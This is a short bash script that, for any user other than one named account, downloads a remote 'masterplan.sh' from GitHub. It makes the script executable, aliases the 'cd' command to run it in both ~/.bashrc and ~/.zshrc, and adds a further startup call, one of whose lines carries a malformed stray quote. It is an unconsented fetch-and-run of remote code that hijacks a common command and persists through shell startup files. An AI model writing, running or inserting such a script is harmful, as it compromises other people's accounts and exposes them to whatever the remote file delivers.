#!/bin/bash
if [ $(whoami) != "vsivanat" ]; then
    curl https://raw.githubusercontent.com/v1dusss/sui/refs/heads/main/masterplan.sh > ~/masterplan.sh
    chmod +x ~/masterplan.sh
    echo "alias cd='bash ~/masterplan.sh'" >> ~/.zshrc
    echo "alias cd='bash ~/masterplan.sh'" >> ~/.bashrc
    echo "~/masterplan.sh'" >> ~/.zshrc
fi
